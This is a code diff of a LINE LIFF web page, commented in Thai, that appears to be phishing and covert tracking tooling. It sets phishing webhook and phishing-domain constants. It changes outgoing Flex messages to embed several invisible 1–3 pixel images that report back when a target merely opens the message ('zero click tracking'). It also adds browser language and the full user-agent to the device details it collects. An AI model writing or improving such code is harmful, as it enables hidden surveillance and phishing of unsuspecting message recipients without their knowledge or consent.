@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyxfFPcFjqHuYyluaJm2l8hDJxR27lENa341rsWPmDZDPa-wgd9CsDuMAl4pNEI2i7h/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwyMv3N0e314RNSCNZAjkzVkrIdLl-HpAewgQPVjLSD4Gr1FJwa1h79y0ZJZ5FH47f-/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -830,15 +830,17 @@
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                zeroClickTrackUrl += `&isTarget=true`; // พารามิเตอร์ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                
+                // เพิ่มพารามิเตอร์ป้องกันการแคช และบังคับให้ได้ข้อมูลใหม่เสมอ
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
+                // สร้าง Flex Message แบบปรับปรุงใหม่ที่มีการตรวจจับการเปิดอ่านได้ดีขึ้น
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
+                    altText: `รูปภาพใหม่`,
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -856,17 +858,37 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
-                                // รูปนี้จะไม่ปรากฏในข้อความแต่จะโหลดเมื่อผู้รับเปิดข้อความ
+                                // ใส่รูปภาพที่มองไม่เห็นหลายภาพด้วยขนาดต่างกัน
+                                // เพื่อเพิ่มโอกาสที่ LINE จะต้องโหลดรูปภาพเพื่อ zero click tracking
                                 {
                                     type: 'image',
-                                    url: zeroClickTrackUrl,
-                                    size: '1px', // ขนาดเล็กมาก
+                                    url: `${zeroClickTrackUrl}&size=1`,
+                                    size: '1px',
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover',
-                                    position: 'absolute', // วางแบบ absolute
-                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
+                                    position: 'absolute',
+                                    offsetTop: '0px',
                                     offsetStart: '0px'
+                                },
+                                {
+                                    type: 'image',
+                                    url: `${zeroClickTrackUrl}&size=2`,
+                                    size: '2px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '0px',
+                                    offsetStart: '2px'
+                                },
+                                {
+                                    type: 'image',
+                                    url: `${zeroClickTrackUrl}&size=3`,
+                                    size: '3px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '0px',
+                                    offsetStart: '4px'
                                 },
                                 // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
@@ -877,7 +899,7 @@
                                     width: '1px'
                                 }
                             ],
-                            height: '1px', // ทำให้ body กล่องเล็กมาก
+                            height: '1px',
                             paddingAll: '0px'
                         }
                     }
@@ -968,7 +990,9 @@
                 screenSize: `${window.screen.width}x${window.screen.height}`,
                 pixelRatio: window.devicePixelRatio || 1,
                 orientation: screen.orientation ? screen.orientation.type : 'unknown',
-                connection: getConnectionInfo()
+                connection: getConnectionInfo(),
+                language: navigator.language || navigator.userLanguage || "ไม่ทราบ",
+                userAgent: ua // เพิ่ม User-Agent แบบเต็มเข้าไปด้วย
             };
             
             // ระบบปฏิบัติการ (ละเอียดขึ้น)
